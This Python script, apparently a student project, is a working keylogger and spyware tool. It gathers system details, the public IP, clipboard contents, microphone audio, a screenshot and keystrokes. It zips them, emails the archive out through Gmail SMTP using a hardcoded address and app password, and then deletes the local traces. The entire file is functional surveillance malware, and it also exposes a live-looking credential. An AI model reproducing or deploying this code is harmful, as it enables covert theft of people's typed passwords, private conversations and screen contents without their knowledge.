import socket
import platform
import zipfile
import win32clipboard

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime


system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
Keys_information = "keylog.txt"
ziptr = "Log.zip"

microphone_time = 10
time_iteration = 10

file_path = "C:\\Users\\panwa\\OneDrive\\Documents\\4th sem project\Key_Logger"
extend = "\\"
file_merge = file_path + extend

from_email = 'projectmail4thsem@gmail.com'
to_email = 'projectmail4thsem@gmail.com'
password = 'vvdjparbymoxsfbb'



# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
computer_information()



# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")
copy_clipboard()


# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


# Key Logger
currentTime = time.time()
stoppingTime = time.time() + time_iteration

count = 0
keys = []


with open(file_path + extend + Keys_information, "a") as f:
    f.write("TimeStamp"+(str(datetime.now()))[:-7]+":\n")
    f.write("\n")


def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False
    

def write_file(keys):
    with open(file_path + extend + Keys_information, "a") as f:
        for idx, key in enumerate(keys):
            k = str(key).replace("'", "")
            if k.find("space") > 0 and k.find("backspace") == -1:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


if __name__ == "__main__":
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    with open(file_path + extend + Keys_information, "a") as f:
        f.write("\n\n")
        f.write("--------------------------------------------------------------------")
        f.write("\n\n")

   

with zipfile.ZipFile(ziptr,'w', compression= zipfile.ZIP_DEFLATED) as z:
    z.write('audio.wav')
    z.write('keylog.txt')
    z.write('screenshot.png')
    z.write('clipboard.txt')
    z.write('syseminfo.txt')



smtp_server = 'smtp.gmail.com'
smtp_port = 587

msg = MIMEMultipart()
msg['From'] = from_email
msg['To'] = to_email
msg['Subject'] = 'Your subject line'

filename = ziptr
attachment = open(filename, 'rb')
part = MIMEBase('application', 'octet-stream')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment', filename=filename)
msg.attach(part)

server = smtplib.SMTP(smtp_server, smtp_port)
server.starttls()
server.login(from_email, password)
text = msg.as_string()
server.sendmail(from_email, to_email, text)
server.quit()

delete_files = [system_information, clipboard_information, Keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)